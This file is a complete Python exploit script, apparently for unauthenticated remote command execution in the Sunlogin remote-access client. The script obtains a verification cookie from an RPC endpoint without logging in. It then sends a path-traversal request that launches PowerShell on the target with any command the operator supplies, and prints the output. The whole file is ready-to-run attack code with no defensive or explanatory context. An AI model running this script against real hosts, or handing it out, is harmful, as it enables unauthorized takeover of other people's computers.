import sys

import requests


class RCE:

    def Get_Cookie(self, ip, cmd):
        try:
            url = "http://" + ip + "/cgi-bin/rpc?action=verify-haras"
            headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) "
                              "Version/14_0_3 Safari/605.1.15",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"}
            cookie = requests.get(url, headers=headers).json()
            cookie = cookie['verify_string']
            self.Rce(ip, cookie, cmd)
        except requests.exceptions.RequestException as e:
            print("Usage: python3 sunlogin_rce.py ip cmd")

    def Terminal(self):
        # print(sys.argv[1])
        rce.Get_Cookie(sys.argv[1], sys.argv[2])

    def Rce(self, ip, cookie, cmd):
        try:
            url = "http://" + ip + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + cmd
            headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) "
                              "Version/14_0_3 Safari/605.1.15",
                "Cookie": "CID=" + cookie,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"}
            re = requests.get(url, headers=headers).text
            print(re)
        except requests.exceptions.RequestException as e:
            print("Usage: python3 sunlogin_rce.py ip cmd")


if __name__ == '__main__':
    # print("Usage: python sunlogin_rce.py ip:port cmd")
    rce = RCE()
    rce.Terminal()
